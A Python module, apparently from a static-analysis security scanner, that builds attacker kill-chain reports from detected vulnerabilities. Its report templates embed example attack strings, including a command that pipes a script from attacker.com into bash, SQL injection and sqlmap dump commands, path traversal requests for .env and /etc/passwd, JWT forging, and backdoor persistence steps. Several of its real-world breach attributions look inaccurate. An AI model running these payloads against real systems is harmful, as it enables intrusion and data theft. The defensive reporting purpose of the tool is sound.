"""
SENTINEL Attack Chain Engine
============================
Takes individual vulnerabilities found by existing scanners and constructs
the complete attacker kill chain — showing HOW vulnerabilities combine
to enable a full breach, not just that they exist individually.

Novel contribution: automated attack graph construction from static analysis.
No pen tester needed. No runtime required. Runs fully locally.
"""

import ast
import re
from dataclasses import dataclass, field
from typing import Optional


# ─────────────────────────────────────────────────────────────────────────────
# DATA STRUCTURES
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class AttackNode:
    """Single step in an attack chain."""
    id: str
    title: str
    description: str
    file: str
    line: int
    code: str
    severity: str
    enables: list = field(default_factory=list)   # what this step unlocks
    requires: list = field(default_factory=list)  # what attacker needs first
    attacker_cost: str = "Low"                    # Low / Medium / High
    impact: str = ""


@dataclass
class AttackChain:
    """Complete multi-step attack path from external attacker to goal."""
    id: str
    title: str
    goal: str                    # what attacker achieves
    steps: list                  # ordered list of AttackNode
    total_severity: str          # CRITICAL / HIGH / MEDIUM
    estimated_time: str          # how long attack takes
    detection_likelihood: str    # Low / Medium / High
    real_world_example: str      # real breach this matches
    impact_summary: str          # what data/systems compromised
    penalty: int                 # score deduction for this chain


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK SURFACE RECONNAISSANCE ENGINE
# ─────────────────────────────────────────────────────────────────────────────

class ReconEngine:
    """
    Simulates attacker reconnaissance phase.
    Maps exposed attack surface from source code alone.
    """

    def __init__(self, extracted_files: dict):
        self.files = extracted_files
        self.endpoints = []
        self.auth_functions = []
        self.data_functions = []
        self.file_operations = []
        self.external_connections = []
        self.admin_functions = []

    def run(self) -> dict:
        for file_path, code_lines in self.files.items():
            if not file_path.endswith('.py'):
                continue
            code = "\n".join(code_lines)
            try:
                tree = ast.parse(code)
                self._walk_tree(tree, file_path, code_lines)
            except SyntaxError:
                pass

        return {
            "endpoints": self.endpoints,
            "auth_functions": self.auth_functions,
            "data_functions": self.data_functions,
            "file_operations": self.file_operations,
            "external_connections": self.external_connections,
            "admin_functions": self.admin_functions,
        }

    def _walk_tree(self, tree, file_path: str, code_lines: list):
        for node in ast.walk(tree):

            # Flask/FastAPI route endpoints
            if isinstance(node, ast.FunctionDef):
                for decorator in node.decorator_list:
                    dec_str = ast.unparse(decorator)
                    if any(x in dec_str for x in ['route', 'get', 'post', 'put', 'delete', 'patch']):
                        self.endpoints.append({
                            "function": node.name,
                            "file": file_path,
                            "line": node.lineno,
                            "decorator": dec_str,
                            "accepts_user_input": self._accepts_user_input(node),
                            "has_auth_check": self._has_auth_check(node),
                            "has_rate_limit": self._has_rate_limit(node),
                        })

                # Auth-related functions
                fn_lower = node.name.lower()
                if any(x in fn_lower for x in ['auth', 'login', 'verify', 'token', 'password', 'credential', 'session']):
                    self.auth_functions.append({
                        "function": node.name,
                        "file": file_path,
                        "line": node.lineno,
                        "has_brute_force_protection": self._has_rate_limit(node),
                        "has_lockout": 'lockout' in ast.unparse(node).lower() or 'attempts' in ast.unparse(node).lower(),
                    })

                # Admin functions
                if any(x in fn_lower for x in ['admin', 'superuser', 'root', 'manage', 'privileged']):
                    self.admin_functions.append({
                        "function": node.name,
                        "file": file_path,
                        "line": node.lineno,
                        "has_auth_check": self._has_auth_check(node),
                    })

                # File operations
                fn_body = ast.unparse(node)
                if any(x in fn_body for x in ['open(', 'read(', 'write(', 'os.path', 'pathlib', 'shutil']):
                    self.file_operations.append({
                        "function": node.name,
                        "file": file_path,
                        "line": node.lineno,
                        "has_path_sanitization": 'realpath' in fn_body or 'abspath' in fn_body or 'basename' in fn_body,
                    })

            # External network connections
            if isinstance(node, ast.Call):
                call_str = ast.unparse(node)
                if any(x in call_str for x in ['requests.get', 'requests.post', 'urllib', 'httpx', 'aiohttp']):
                    try:
                        line_no = node.lineno
                        self.external_connections.append({
                            "call": call_str[:80],
                            "file": file_path,
                            "line": line_no,
                        })
                    except Exception:
                        pass

    def _accepts_user_input(self, node) -> bool:
        body = ast.unparse(node)
        return any(x in body for x in ['request.args', 'request.form', 'request.json', 'request.data', 'request.GET', 'request.POST'])

    def _has_auth_check(self, node) -> bool:
        body = ast.unparse(node)
        return any(x in body for x in ['login_required', 'authenticate', 'verify_token', 'require_auth', 'jwt', 'session.get', 'current_user'])

    def _has_rate_limit(self, node) -> bool:
        body = ast.unparse(node)
        return any(x in body for x in ['rate_limit', 'ratelimit', 'throttle', 'limiter', 'cooldown', 'sleep('])


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK CHAIN CONSTRUCTOR
# ─────────────────────────────────────────────────────────────────────────────

class AttackChainEngine:
    """
    Core engine. Takes individual vulnerabilities from all 5 existing SENTINEL
    scanners and constructs multi-step attack chains showing how they combine.
    
    This is the novel layer — not finding individual bugs but showing
    how they chain into complete breaches.
    """

    def __init__(self, issues: list, recon: dict, extracted_files: dict):
        self.issues = issues
        self.recon = recon
        self.files = extracted_files
        self.chains = []

        # Index issues by type for fast lookup
        self.secrets = [i for i in issues if 'secret' in i.get('explanation', '').lower() or 'hardcoded' in i.get('explanation', '').lower()]
        self.sql_issues = [i for i in issues if 'sql' in i.get('explanation', '').lower()]
        self.taint_issues = [i for i in issues if i.get('type') == 'DATA_FLOW_EXPLOIT']
        self.path_issues = [i for i in issues if 'path' in i.get('explanation', '').lower()]
        self.dep_issues = [i for i in issues if i.get('source') in ('OSV_LIVE', 'FALLBACK_DB')]
        self.debug_issues = [i for i in issues if 'debug' in i.get('explanation', '').lower()]
        self.network_issues = [i for i in issues if 'network' in i.get('explanation', '').lower() or 'outbound' in i.get('explanation', '').lower()]

    def build_all_chains(self) -> list:
        """Run all chain detectors. Return chains sorted by severity."""

        self._chain_credential_theft_to_full_access()
        self._chain_sql_to_data_exfiltration()
        self._chain_taint_to_rce()
        self._chain_path_traversal_to_secret_leak()
        self._chain_debug_to_recon()
        self._chain_dep_vuln_to_rce()
        self._chain_idor_detection()
        self._chain_no_auth_admin()
        self._chain_full_breach()

        # Sort: CRITICAL first
        rank = {"CRITICAL": 3, "HIGH": 2, "MEDIUM": 1}
        self.chains.sort(key=lambda c: rank.get(c.total_severity, 0), reverse=True)
        return self.chains

    # ── CHAIN 1: Hardcoded secret → external service takeover ────────────────
    def _chain_credential_theft_to_full_access(self):
        if not self.secrets:
            return

        for secret in self.secrets[:3]:  # top 3 secrets max
            var_name = secret.get('code', '').split('=')[0].strip()
            service = self._guess_service(var_name)

            chain = AttackChain(
                id="CHAIN_SECRET_TAKEOVER",
                title=f"Hardcoded credential → {service} account takeover",
                goal=f"Complete control of {service} account and all associated data",
                steps=[
                    AttackNode(
                        id="S1",
                        title="Credential discovery",
                        description=f"Attacker reads source code (via GitHub leak, disgruntled employee, or path traversal) and finds {var_name} hardcoded on line {secret.get('line')}.",
                        file=secret.get('file', ''),
                        line=secret.get('line', 0),
                        code=secret.get('code', ''),
                        severity="CRITICAL",
                        enables=["S2"],
                        attacker_cost="Zero — credential is plaintext in source",
                        impact="Credential obtained without any hacking skill"
                    ),
                    AttackNode(
                        id="S2",
                        title=f"{service} API authentication",
                        description=f"Attacker uses stolen {var_name} to authenticate directly to {service} API. No password needed. No 2FA bypass needed. Credential is valid.",
                        file=secret.get('file', ''),
                        line=secret.get('line', 0),
                        code=f"curl -H 'Authorization: {var_name}' https://api.{service.lower()}.com/",
                        severity="CRITICAL",
                        enables=["S3"],
                        attacker_cost="Zero — single API call",
                        impact=f"Full {service} account access"
                    ),
                    AttackNode(
                        id="S3",
                        title="Data exfiltration and persistent access",
                        description=f"With valid {service} credentials, attacker dumps all data, creates backdoor API keys, revokes legitimate access, locks out real owner.",
                        file=secret.get('file', ''),
                        line=secret.get('line', 0),
                        code=f"# Attacker creates backdoor key — owner locked out\nattacker_key = {service.lower()}_client.create_api_key(name='backup')\nlegit_key.revoke()",
                        severity="CRITICAL",
                        attacker_cost="Zero",
                        impact="Persistent access even after password change"
                    )
                ],
                total_severity="CRITICAL",
                estimated_time="Under 5 minutes from code access to full account control",
                detection_likelihood="Low — looks like legitimate API calls",
                real_world_example="Uber 2022 breach — hardcoded credential in PowerShell script led to complete AWS/GCP takeover",
                impact_summary=f"Complete {service} account takeover. All data accessible. Billing hijackable. Legitimate owner locked out.",
                penalty=40
            )
            self.chains.append(chain)

    # ── CHAIN 2: SQL injection → full database dump ───────────────────────────
    def _chain_sql_to_data_exfiltration(self):
        if not self.sql_issues:
            return

        sql = self.sql_issues[0]
        chain = AttackChain(
            id="CHAIN_SQL_DUMP",
            title="SQL injection → complete database exfiltration",
            goal="Download entire database including all user records, passwords, payment data",
            steps=[
                AttackNode(
                    id="Q1",
                    title="Vulnerability confirmation",
                    description=f"Attacker sends test payload to endpoint containing {sql.get('code', 'vulnerable query')} and confirms SQL injection by observing error messages or response differences.",
                    file=sql.get('file', ''),
                    line=sql.get('line', 0),
                    code="GET /api/user?id=1' -- \n→ Response: MySQL syntax error\n→ Confirms: SQL injection exists",
                    severity="HIGH",
                    enables=["Q2"],
                    attacker_cost="5 minutes with sqlmap",
                    impact="Attack surface confirmed"
                ),
                AttackNode(
                    id="Q2",
                    title="Schema enumeration",
                    description="Attacker uses UNION-based or blind injection to enumerate all table names, column names, and data types.",
                    file=sql.get('file', ''),
                    line=sql.get('line', 0),
                    code="id=1 UNION SELECT table_name,2,3 FROM information_schema.tables--\n→ Returns: users, orders, payments, sessions, admin_accounts",
                    severity="CRITICAL",
                    enables=["Q3"],
                    attacker_cost="10 minutes automated",
                    impact="Complete database schema exposed"
                ),
                AttackNode(
                    id="Q3",
                    title="Full data extraction",
                    description="With schema known, attacker dumps all tables. Automated tools extract millions of records in minutes.",
                    file=sql.get('file', ''),
                    line=sql.get('line', 0),
                    code="# sqlmap does this automatically:\nsqlmap -u 'https://target.com/api/user?id=1' --dump-all\n→ 47,000 users extracted\n→ Passwords, emails, addresses, payment data",
                    severity="CRITICAL",
                    attacker_cost="30 minutes fully automated",
                    impact="Complete data breach. GDPR violation. Potential company-ending fine."
                )
            ],
            total_severity="CRITICAL",
            estimated_time="45 minutes from discovery to full database dump",
            detection_likelihood="Low — injection traffic resembles normal queries",
            real_world_example="Equifax 2017 — SQL injection chain led to 147 million records exposed. $575M settlement.",
            impact_summary="Every user record, password hash, email, and payment detail in the database is in attacker's hands.",
            penalty=45
        )
        self.chains.append(chain)

    # ── CHAIN 3: Taint flow → Remote Code Execution ───────────────────────────
    def _chain_taint_to_rce(self):
        if not self.taint_issues:
            return

        taint = self.taint_issues[0]
        source = taint.get('explanation', '').split("'")[1] if "'" in taint.get('explanation', '') else 'user input'
        sink = taint.get('code', 'eval()')

        chain = AttackChain(
            id="CHAIN_TAINT_RCE",
            title=f"Unsanitised {source} → Remote Code Execution",
            goal="Execute arbitrary code on the server — full system compromise",
            steps=[
                AttackNode(
                    id="T1",
                    title="Payload injection",
                    description=f"Attacker sends malicious payload through {source}. No authentication required. No special skill needed.",
                    file=taint.get('file', ''),
                    line=taint.get('source_line', taint.get('line', 0)),
                    code=f"# Attacker sends:\n__import__('os').system('curl attacker.com/shell.sh | bash')",
                    severity="CRITICAL",
                    enables=["T2"],
                    attacker_cost="Zero — single HTTP request",
                    impact="Arbitrary Python code now runs on your server"
                ),
                AttackNode(
                    id="T2",
                    title="Reverse shell established",
                    description="Injected code downloads and executes reverse shell. Attacker now has interactive terminal on your server.",
                    file=taint.get('file', ''),
                    line=taint.get('sink_line', taint.get('line', 0)),
                    code=f"# {sink} executes payload\n# Attacker now has:\n$ whoami → www-data\n$ ls /etc/passwd → full user list\n$ cat .env → all secrets\n$ cat /proc/1/environ → all environment variables",
                    severity="CRITICAL",
                    enables=["T3"],
                    attacker_cost="2 minutes setup",
                    impact="Interactive shell on your production server"
                ),
                AttackNode(
                    id="T3",
                    title="Lateral movement and persistence",
                    description="From the shell, attacker reads all credentials, accesses all databases, pivots to other internal services, installs persistent backdoor.",
                    file=taint.get('file', ''),
                    line=taint.get('sink_line', taint.get('line', 0)),
                    code="# From reverse shell:\ncat .env  →  DATABASE_URL, AWS_KEY, STRIPE_KEY\nmysql -h db -u root -p$(cat .env | grep DB_PASS)  →  full DB access\ncrontab -e  →  persistence installed, survives restarts",
                    severity="CRITICAL",
                    attacker_cost="30 minutes",
                    impact="Complete infrastructure compromise. All secrets stolen. Persistent access installed."
                )
            ],
            total_severity="CRITICAL",
            estimated_time="Under 1 hour from first request to complete system control",
            detection_likelihood="Very Low — looks like normal application traffic until shell established",
            real_world_example="Log4Shell 2021 — untrusted data in eval-equivalent path. 100M+ systems vulnerable. CVSS 10.0.",
            impact_summary="Attacker has root-equivalent access to your server, all databases, all secrets, all connected services.",
            penalty=50
        )
        self.chains.append(chain)

    # ── CHAIN 4: Path traversal → secrets → service takeover ─────────────────
    def _chain_path_traversal_to_secret_leak(self):
        file_ops = self.recon.get('file_operations', [])
        unsanitised = [f for f in file_ops if not f.get('has_path_sanitization')]
        if not unsanitised and not self.secrets:
            return
        if not unsanitised:
            return

        op = unsanitised[0]
        chain = AttackChain(
            id="CHAIN_PATH_TRAVERSAL",
            title="Path traversal → config file read → credential theft",
            goal="Read server configuration files containing all application secrets",
            steps=[
                AttackNode(
                    id="P1",
                    title="Path traversal exploitation",
                    description=f"Function {op['function']}() in {op['file']} accepts user-controlled file path with no sanitization. Attacker walks up directory tree.",
                    file=op['file'],
                    line=op['line'],
                    code="GET /api/files?path=../../.env\nGET /api/files?path=../../config/settings.py\nGET /api/files?path=../../../etc/passwd",
                    severity="HIGH",
                    enables=["P2"],
                    attacker_cost="5 minutes — standard attack tool",
                    impact="Any file on server filesystem readable"
                ),
                AttackNode(
                    id="P2",
                    title="Secrets extraction",
                    description="Attacker reads .env file or settings.py — obtains database credentials, API keys, JWT secrets, cloud provider keys.",
                    file=op['file'],
                    line=op['line'],
                    code="# Contents of .env now readable:\nDATABASE_URL=postgresql://admin:ProdPass@db:5432/main\nAWS_ACCESS_KEY=AKIA...\nSTRIPE_SECRET=sk_live_...\nJWT_SECRET=supersecret",
                    severity="CRITICAL",
                    enables=["P3"],
                    attacker_cost="Zero — files read directly",
                    impact="All application secrets compromised in one request"
                ),
                AttackNode(
                    id="P3",
                    title="Complete system takeover",
                    description="With all credentials, attacker accesses database directly, controls cloud infrastructure, impersonates any user via JWT secret.",
                    file=op['file'],
                    line=op['line'],
                    code="# Using stolen JWT_SECRET:\nimport jwt\nforged_token = jwt.encode({'user_id': 1, 'role': 'admin'}, stolen_jwt_secret)\n# Attacker is now admin on your platform",
                    severity="CRITICAL",
                    attacker_cost="10 minutes",
                    impact="Full platform compromise. Every user account forged-accessible. Database fully readable."
                )
            ],
            total_severity="CRITICAL",
            estimated_time="20 minutes from first request to full system access",
            detection_likelihood="Low — file read requests look legitimate",
            real_world_example="Capital One 2019 — path traversal led to 100M customer records. $80M fine.",
            impact_summary="All secrets, all databases, all user accounts accessible via forged tokens.",
            penalty=40
        )
        self.chains.append(chain)

    # ── CHAIN 5: Debug mode → information disclosure → targeted attack ─────────
    def _chain_debug_to_recon(self):
        if not self.debug_issues:
            return

        debug = self.debug_issues[0]
        chain = AttackChain(
            id="CHAIN_DEBUG_RECON",
            title="Debug mode → stack trace leakage → targeted exploitation",
            goal="Use leaked internal information to craft precise targeted attacks",
            steps=[
                AttackNode(
                    id="D1",
                    title="Error trigger and stack trace harvest",
                    description="Attacker sends malformed requests to trigger errors. Debug mode returns full stack traces with internal paths, library versions, and code structure.",
                    file=debug.get('file', ''),
                    line=debug.get('line', 0),
                    code="GET /api/user?id=INVALID\n\n→ Debug response:\nTraceback:\n  File '/app/backend/scanner/engine.py', line 47\n  File '/app/backend/models/user.py', line 23\nSQLAlchemy version: 1.4.23\nPython: 3.9.1\nOS: Linux 5.4.0",
                    severity="MEDIUM",
                    enables=["D2"],
                    attacker_cost="Zero — just send bad requests",
                    impact="Complete internal architecture mapped without any hacking"
                ),
                AttackNode(
                    id="D2",
                    title="Targeted CVE exploitation",
                    description="With exact library versions known, attacker looks up CVEs for those specific versions and deploys pre-built exploits.",
                    file=debug.get('file', ''),
                    line=debug.get('line', 0),
                    code="# Attacker learns: SQLAlchemy 1.4.23\n# Searches: SQLAlchemy 1.4.23 CVE\n# Finds: CVE-2022-XXXX affects 1.4.x\n# Downloads: pre-built exploit\n# Deploys: targeted attack with 100% success rate",
                    severity="HIGH",
                    enables=[],
                    attacker_cost="30 minutes with known CVE",
                    impact="100% reliable exploit because exact version confirmed"
                )
            ],
            total_severity="HIGH",
            estimated_time="1-2 hours from debug discovery to targeted exploit",
            detection_likelihood="Low — error requests look like buggy clients",
            real_world_example="Debug mode left on is in OWASP Top 10 Security Misconfiguration. Responsible for thousands of breaches annually.",
            impact_summary="Attacker has complete roadmap of your internal architecture and exact exploit to use against it.",
            penalty=20
        )
        self.chains.append(chain)

    # ── CHAIN 6: Vulnerable dependency → known RCE exploit ───────────────────
    def _chain_dep_vuln_to_rce(self):
        critical_deps = [i for i in self.dep_issues if i.get('severity') == 'CRITICAL']
        if not critical_deps:
            high_deps = [i for i in self.dep_issues if i.get('severity') == 'HIGH']
            if not high_deps:
                return
            dep = high_deps[0]
        else:
            dep = critical_deps[0]

        cve = dep.get('explanation', 'CVE').split(']')[0].replace('[', '')
        pkg = dep.get('code', 'package').split('==')[0]

        chain = AttackChain(
            id="CHAIN_DEP_RCE",
            title=f"{pkg} vulnerable version → {cve} exploitation",
            goal="Exploit known public CVE in your dependency before you patch it",
            steps=[
                AttackNode(
                    id="V1",
                    title="Vulnerable version fingerprinting",
                    description=f"Attacker identifies your {pkg} version from error messages, HTTP headers, or response timing. Confirms {cve} applies.",
                    file=dep.get('file', ''),
                    line=dep.get('line', 0),
                    code=f"# Attacker confirms version via:\ncurl -I https://target.com\n→ Server: gunicorn\n→ X-Powered-By: {pkg}\n# Metasploit module for {cve} loaded",
                    severity="HIGH",
                    enables=["V2"],
                    attacker_cost="10 minutes — public exploit available",
                    impact="Attack confirmed viable before first exploit attempt"
                ),
                AttackNode(
                    id="V2",
                    title="Public exploit deployment",
                    description=f"Pre-built exploit for {cve} deployed. No custom code needed. Exploit code publicly available on GitHub and Exploit-DB.",
                    file=dep.get('file', ''),
                    line=dep.get('line', 0),
                    code=f"# From Exploit-DB:\npython exploit_{cve.replace('-','_')}.py --target https://your-app.com\n→ Shell obtained\n→ Running as: www-data",
                    severity="CRITICAL",
                    attacker_cost="Zero skill — script kiddie level",
                    impact="Complete system compromise using publicly available exploit code"
                )
            ],
            total_severity="CRITICAL",
            estimated_time="30 minutes — exploit is pre-built",
            detection_likelihood="Medium — exploit traffic has known signatures",
            real_world_example="Log4Shell, Heartbleed, Struts RCE (Equifax) — all exploited via publicly known CVEs in dependencies.",
            impact_summary=f"Pre-built exploit for {cve} available to anyone. Zero skill required to compromise your system.",
            penalty=35
        )
        self.chains.append(chain)

    # ── CHAIN 7: IDOR detection (no ownership checks) ─────────────────────────
    def _chain_idor_detection(self):
        endpoints = self.recon.get('endpoints', [])
        idor_candidates = []

        for ep in endpoints:
            dec = ep.get('decorator', '')
            # Look for endpoints with ID parameters and no auth
            if ('<' in dec or 'id' in dec.lower() or '{id}' in dec) and not ep.get('has_auth_check'):
                idor_candidates.append(ep)

        if not idor_candidates:
            return

        ep = idor_candidates[0]
        chain = AttackChain(
            id="CHAIN_IDOR",
            title="Missing ownership check → IDOR → all user data exposed",
            goal="Access any other user's private data by changing a number in the URL",
            steps=[
                AttackNode(
                    id="I1",
                    title="Own resource access",
                    description=f"Attacker creates legitimate account. Accesses their own data at {ep.get('decorator', '/api/user/<id>')}. Notes their user ID in the URL.",
                    file=ep.get('file', ''),
                    line=ep.get('line', 0),
                    code=f"GET {ep.get('decorator', '/api/user/1234').replace('@app.route(','').strip(chr(39)+chr(34)+')')}\n→ Returns: my own data",
                    severity="MEDIUM",
                    enables=["I2"],
                    attacker_cost="Zero — just create a free account",
                    impact="Attack baseline established"
                ),
                AttackNode(
                    id="I2",
                    title="ID enumeration — all users exposed",
                    description="No ownership check in code means changing ID number returns other users' data. Attacker iterates all IDs automatically.",
                    file=ep.get('file', ''),
                    line=ep.get('line', 0),
                    code="# Automated enumeration:\nfor id in range(1, 100000):\n    resp = requests.get(f'/api/user/{id}')\n    if resp.status_code == 200:\n        save(resp.json())  # every user's data\n\n→ 47,000 users' full profiles downloaded",
                    severity="CRITICAL",
                    attacker_cost="1 hour automated script",
                    impact="Every user's private data accessible. GDPR breach. Company-ending fine."
                )
            ],
            total_severity="CRITICAL",
            estimated_time="1 hour to download all user data",
            detection_likelihood="Low — requests look like normal API traffic",
            real_world_example="IDOR is OWASP API #1. Responsible for Facebook's 2021 533M user breach.",
            impact_summary="Every user's private data downloadable by any registered attacker with a free account.",
            penalty=35
        )
        self.chains.append(chain)

    # ── CHAIN 8: Admin function with no auth check ────────────────────────────
    def _chain_no_auth_admin(self):
        admin_fns = self.recon.get('admin_functions', [])
        unprotected = [f for f in admin_fns if not f.get('has_auth_check')]
        if not unprotected:
            return

        fn = unprotected[0]
        chain = AttackChain(
            id="CHAIN_BROKEN_AUTH_ADMIN",
            title="Unprotected admin function → complete privilege escalation",
            goal="Gain admin access without credentials",
            steps=[
                AttackNode(
                    id="A1",
                    title="Admin endpoint discovery",
                    description=f"Function {fn['function']}() has admin in name but no authentication check. Attacker discovers via directory brute force or API spec leakage.",
                    file=fn['file'],
                    line=fn['line'],
                    code=f"# Attacker runs:\ndirbuster -u https://target.com/api/ -w common.txt\n→ Finds: /api/{fn['function'].replace('_','/')}\n→ No auth required",
                    severity="CRITICAL",
                    enables=["A2"],
                    attacker_cost="15 minutes automated scan",
                    impact="Admin endpoint found with no authentication"
                ),
                AttackNode(
                    id="A2",
                    title="Privilege escalation",
                    description="Direct call to admin function with no credentials grants full admin access. Attacker can now modify any user, access all data, delete records.",
                    file=fn['file'],
                    line=fn['line'],
                    code=f"POST /api/{fn['function'].replace('_','/')}\n{{}}\n→ 200 OK\n→ Admin access granted\n→ Can now: delete users, export all data, modify permissions",
                    severity="CRITICAL",
                    attacker_cost="Zero — single HTTP request",
                    impact="Complete admin control with zero credentials"
                )
            ],
            total_severity="CRITICAL",
            estimated_time="20 minutes",
            detection_likelihood="Low — admin API calls look legitimate",
            real_world_example="Broken Function Level Authorization — OWASP API Top 10 #5.",
            impact_summary="Any attacker has full admin access to your platform. All users' data modifiable or deletable.",
            penalty=40
        )
        self.chains.append(chain)

    # ── CHAIN 9: Full kill chain if multiple vuln types present ───────────────
    def _chain_full_breach(self):
        # Only build full chain if 3+ vulnerability types present
        vuln_types_present = sum([
            bool(self.secrets),
            bool(self.sql_issues),
            bool(self.taint_issues),
            bool(self.dep_issues),
            bool(self.debug_issues),
        ])

        if vuln_types_present < 3:
            return

        chain = AttackChain(
            id="CHAIN_FULL_BREACH",
            title="Complete kill chain — reconnaissance to full infrastructure takeover",
            goal="Total system compromise: data stolen, backdoor installed, owner locked out",
            steps=[
                AttackNode(
                    id="K1",
                    title="Passive reconnaissance",
                    description="Attacker maps system from public information: GitHub repo, error messages, job postings revealing tech stack, debug endpoints.",
                    file="",
                    line=0,
                    code="# No hacking yet — just observation:\ngit clone https://github.com/target/repo  # if public\ncurl https://target.com/api/invalid  # debug stack trace\nLinkedIn: 'We use Flask, PostgreSQL, AWS'",
                    severity="LOW",
                    enables=["K2"],
                    attacker_cost="2 hours passive research",
                    impact="Complete architecture map with zero interaction"
                ),
                AttackNode(
                    id="K2",
                    title="Initial access via lowest-effort vulnerability",
                    description="Attacker picks easiest vulnerability from reconnaissance. Hardcoded secret or path traversal requires zero skill.",
                    file=self.secrets[0].get('file', '') if self.secrets else '',
                    line=self.secrets[0].get('line', 0) if self.secrets else 0,
                    code="# Easiest path chosen:\ncat leaked_source.py | grep -E 'key|secret|password|token'\n→ Found: 3 live credentials in plaintext",
                    severity="CRITICAL",
                    enables=["K3"],
                    attacker_cost="10 minutes",
                    impact="First foothold established"
                ),
                AttackNode(
                    id="K3",
                    title="Privilege escalation and lateral movement",
                    description="From initial access, attacker pivots to database, cloud infrastructure, internal APIs using stolen credentials.",
                    file="",
                    line=0,
                    code="# With stolen AWS key:\naws s3 ls  →  all S3 buckets listed\naws s3 cp s3://company-backups/db.sql .  →  full DB backup downloaded\naws iam create-user backdoor  →  permanent access created",
                    severity="CRITICAL",
                    enables=["K4"],
                    attacker_cost="1 hour",
                    impact="Full infrastructure access"
                ),
                AttackNode(
                    id="K4",
                    title="Data exfiltration and persistence",
                    description="All valuable data copied to attacker's server. Backdoor accounts created. Ransomware optionally deployed. Evidence potentially destroyed.",
                    file="",
                    line=0,
                    code="# Exfiltration:\nexfil_all_db_tables()  →  47,000 users\nexfil_s3_buckets()     →  all files\n\n# Persistence:\ncreate_backdoor_admin()\ninstall_cron_reverse_shell()\n\n# Optional:\nencrypt_all_files()    →  ransomware deployed",
                    severity="CRITICAL",
                    attacker_cost="2-4 hours total",
                    impact="Complete data breach. Ransomware possible. Evidence destroyed. Permanent backdoor."
                )
            ],
            total_severity="CRITICAL",
            estimated_time="4-8 hours from first reconnaissance to complete system control",
            detection_likelihood="Very Low — professional attacker stays below alert thresholds",
            real_world_example="SolarWinds 2020 — 18,000 organizations breached. Multiple vulnerability types chained. 9 months undetected.",
            impact_summary="Total infrastructure compromise. Every database, every secret, every user account. Ransomware deployment possible. Permanent backdoor installed.",
            penalty=60
        )
        self.chains.append(chain)

    # ── HELPERS ───────────────────────────────────────────────────────────────
    def _guess_service(self, var_name: str) -> str:
        var_lower = var_name.lower()
        if 'stripe' in var_lower: return 'Stripe'
        if 'aws' in var_lower or 'amazon' in var_lower: return 'AWS'
        if 'sendgrid' in var_lower: return 'SendGrid'
        if 'twilio' in var_lower: return 'Twilio'
        if 'openai' in var_lower or 'gpt' in var_lower: return 'OpenAI'
        if 'github' in var_lower: return 'GitHub'
        if 'slack' in var_lower: return 'Slack'
        if 'google' in var_lower or 'gcp' in var_lower: return 'Google Cloud'
        if 'azure' in var_lower: return 'Azure'
        if 'jwt' in var_lower: return 'Authentication System'
        if 'db' in var_lower or 'database' in var_lower or 'postgres' in var_lower: return 'Database'
        return 'External Service'


# ─────────────────────────────────────────────────────────────────────────────
# PUBLIC API — called by engine.py
# ─────────────────────────────────────────────────────────────────────────────

def run_attack_chain_analysis(issues: list, extracted_files: dict) -> dict:
    """
    Main entry point. Called after all 5 existing scanners complete.
    Takes their combined output and builds attack chains.
    
    Returns dict with:
    - chains: list of AttackChain objects serialised to dicts
    - recon: attack surface map
    - attack_score: additional score penalty for chain risk
    - highest_chain_severity: for UI display
    """

    # Step 1: Reconnaissance
    recon_engine = ReconEngine(extracted_files)
    recon = recon_engine.run()

    # Step 2: Build chains
    chain_engine = AttackChainEngine(issues, recon, extracted_files)
    chains = chain_engine.build_all_chains()

    # Step 3: Calculate additional penalty
    # Chains are worse than individual vulns — the combination is deadlier
    chain_penalty = 0
    for chain in chains[:3]:  # top 3 chains only to cap penalty
        chain_penalty += chain.penalty

    # Step 4: Serialise
    chains_serialised = []
    for chain in chains:
        chains_serialised.append({
            "id": chain.id,
            "title": chain.title,
            "goal": chain.goal,
            "total_severity": chain.total_severity,
            "estimated_time": chain.estimated_time,
            "detection_likelihood": chain.detection_likelihood,
            "real_world_example": chain.real_world_example,
            "impact_summary": chain.impact_summary,
            "penalty": chain.penalty,
            "steps": [
                {
                    "id": s.id,
                    "title": s.title,
                    "description": s.description,
                    "file": s.file,
                    "line": s.line,
                    "code": s.code,
                    "severity": s.severity,
                    "attacker_cost": s.attacker_cost,
                    "impact": s.impact,
                }
                for s in chain.steps
            ]
        })

    highest = "NONE"
    if chains:
        sev_rank = {"CRITICAL": 3, "HIGH": 2, "MEDIUM": 1}
        highest = max(chains, key=lambda c: sev_rank.get(c.total_severity, 0)).total_severity

    return {
        "chains": chains_serialised,
        "recon": {
            "total_endpoints": len(recon.get("endpoints", [])),
            "unprotected_endpoints": len([e for e in recon.get("endpoints", []) if not e.get("has_auth_check")]),
            "auth_functions": len(recon.get("auth_functions", [])),
            "file_operations": len(recon.get("file_operations", [])),
            "unsanitised_file_ops": len([f for f in recon.get("file_operations", []) if not f.get("has_path_sanitization")]),
            "external_connections": len(recon.get("external_connections", [])),
            "admin_functions": len(recon.get("admin_functions", [])),
            "unprotected_admin": len([f for f in recon.get("admin_functions", []) if not f.get("has_auth_check")]),
        },
        "chain_count": len(chains),
        "chain_penalty": min(chain_penalty, 60),  # cap at 60 extra penalty
        "highest_chain_severity": highest,
    }
